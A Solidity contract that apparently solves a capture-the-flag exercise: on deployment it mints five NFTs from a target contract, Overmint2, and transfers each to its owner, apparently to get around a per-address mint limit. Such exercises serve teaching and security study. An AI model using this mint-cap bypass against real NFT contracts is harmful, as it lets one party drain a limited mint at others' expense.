// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.13;

import "./Overmint2.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Attacker is IERC721Receiver, Ownable {
    Overmint2 public victim;
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor(Overmint2 _victim)  {
        victim = _victim;
        attack();
    }

    function attack() public {
        for (uint256 i = 0; i < 5; i++) {
            victim.mint();
            victim.transferFrom(address(this), owner(), i + 1);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

}
